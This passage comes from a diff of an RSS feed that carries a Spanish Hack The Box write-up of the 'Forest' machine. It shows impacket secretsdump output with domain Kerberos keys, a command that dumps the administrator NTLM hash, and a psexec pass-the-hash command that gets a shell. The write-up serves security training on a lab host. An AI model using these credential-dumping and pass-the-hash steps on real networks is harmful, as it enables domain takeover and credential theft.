+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:des-cbc-md5:702a3445e0d65b58
+htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:des-cbc-md5:a2ab5eef017fb9da
+htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:des-cbc-md5:4075ad528ab9e5fd
+FOREST$:aes256-cts-hmac-sha1-96:d409d743b2d787ba4a45692058388533840bb55a4d1fd65f8e345164d2df5078
+FOREST$:aes128-cts-hmac-sha1-96:c7306933e272b5b5992f9c9ff688eaa2
+FOREST$:des-cbc-md5:c8132fbf73c71fa8
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up... 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.26.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Logramos obtener los hashes de la mayoria de usuarios, podemos obtener el de un solo usuario, en este caso el que nos interesa es el del usuario administrator.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user administrator
+Impacket v0.9.21-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.28.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos psexec.py para obtener nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt; y una shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rlwrap psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-30%2000.43.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/forest/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/forest/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>enum4linux</category>
+            
+          
+            
+              <category>kerberos</category>
+            
+          
+            
+              <category>smbmap</category>
+            
+          
+            
+              <category>impacket</category>
+            
+          
+            
+              <category>evil-winrm</category>
+            
+          
+            
+              <category>bloodhound</category>
+            
+          
+            
+              <category>aclpwn</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>windows</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
